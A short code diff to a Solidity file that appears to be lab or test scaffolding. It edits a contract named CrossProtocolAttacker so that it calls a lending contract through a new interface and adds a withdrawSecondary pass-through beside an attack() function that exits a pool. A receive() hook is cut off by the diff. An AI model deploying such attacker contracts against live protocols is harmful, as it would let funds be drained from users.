@@ -82,17 +82,26 @@ contract CollateralLending {
     }
 }
 
+interface ILending {
+    function disableSecondaryCollateral() external;
+    function withdrawSecondary() external returns (uint256);
+}
+
 contract CrossProtocolAttacker {
     TransientPool public immutable pool;
-    CollateralLending public immutable lending;
+    ILending public immutable lending;
 
-    constructor(TransientPool pool_, CollateralLending lending_) {
+    constructor(TransientPool pool_, ILending lending_) {
         pool = pool_;
         lending = lending_;
     }
 
     function attack() external {
         pool.exitPool(address(this));
+    }
+
+    function withdrawSecondary() external returns (uint256) {
+        return lending.withdrawSecondary();
     }
 
     receive() external payable {
